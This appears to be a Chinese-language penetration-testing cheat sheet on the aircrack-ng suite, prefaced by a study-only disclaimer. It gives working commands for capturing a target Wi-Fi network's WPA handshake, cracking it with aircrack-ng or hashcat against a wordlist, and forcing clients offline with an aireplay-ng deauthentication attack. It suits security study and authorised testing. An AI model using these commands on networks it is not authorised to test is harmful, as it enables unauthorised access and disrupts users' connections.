# Aircrack

<p align="center">
    <img src="../../../assets/img/logo/aircrack-ng.jpg" width="25%"></a>
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**简介**

aircrack 是一个比较出名的用于破解 WEP 和 WPA 加密的无线网络的一款工具，由 6 个不同的部分组成：
1. aircrack-ng
用于破解 WEP 以及 WPA-PSK 密钥。一旦 aircrack-ng 工具收集了足够的信息，aircrack-ng 将会分析这些数据，
并试图确定使用中的密钥。
2. airdecap-ng 解读被破解的网络数据包
3. airmon-ng 为使用整个 aircrack-ng 套件配置一个网卡
4. aireplay-ng 在无线网络中产生可能在恢复中的 WEP 密钥所需的流量
5. airodump-ng 捕获被 aircrack-ng 用于破解 WEP 密钥的 802.11 帧
6. tools 为微调提供分类工具箱

**文章**
- [记一次曲折的WIFI测试之路](https://www.secpulse.com/archives/96964.html)

---

# 例子

以无线网卡名为 wlan0 举例

```bash
airmon-ng start wlan0   # 启动网卡监听模式
airmon-ng check kill    # 关闭干扰程序

airodump-ng wlan0mon    # 开启抓包,获取附件无线网络
# BSSID(Basic Service SetIdentifier): AP 的 MAC 地址。
# PWR(Power): 信号强度。
# Beacons: AP 发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送 10 个左右的 beacon，
# 所以它们能在很远的地方就被发现。
# #Data:当前数据传输量。
# #/s:过去 10 秒钟内每秒捕获数据分组的数量。
# CH(Channel): AP 所在的频道。
# MB: AP 的最大传输速度。MB=11 => 802.11b，MB=22 => 802.11b+， MB>22 => 802.11g。后面带.的表
# 示短封包标头，处理速度快，更利于破解。
# ENC(Encryption): 使用的加密算法体系。
# CIPHER: 检测到的加密算法。#这个和 ENC 的区别我确实不明白，有没有知道的朋友可以告诉我。
# AUTH(Authority): 认证方式。
# ESSID(The Extended Service Set Identifier): AP 的名称。

airodump-ng -c 6 --bssid E0:24:81:AF:F3:A8 -w wireless wlan0mon     # 指定特定的wifi抓握手包,出现 handshake 则抓包成功
# -c 指定信道,上面已经标记目标热点的信道(CH)
# -bssid 指定目标路由器的BSSID,就是上面标记的BSSID
# -w 指定抓取的数据包保存的目录

aircrack-ng -a2 -b E0:24:81:AF:F3:A8 -w pass.txt wireless-01.cap    # 跑包
```

**使用 hashcat 爆破(只能跑 WPA/WPA2/PSK 加密的)**

用 aircrack-ng 把 cap 转换成 hccap 类型数据包(会自动添加后缀名 .hccap)
```bash
aircrack-ng wireless-01.cap -J wireless
```

```bash
hashcat -m 2500 wireless.hccap pass.txt --force                     # 用hashcat破解WPA/PSK密码
```

若是提示"Old hccap format detected! You need to update"可以将第一步的命令改为
```bash
aircrack-ng wireless-01.cap -j wireless
```

注意如果抓不到握手包把对方踢下线,这样就会抓包成功
```bash
aireplay-ng -0 10 -a <无线路由器的MAC地址> -c <连接上的设备MAC地址> wlan0mon
# -0 冲突攻击模式，后面跟发送次数，一般使用这个模式即可。
# -a 无线网 mac 地址
# -c 连接上的客户端 mac 地址，就是那个 STATION
```
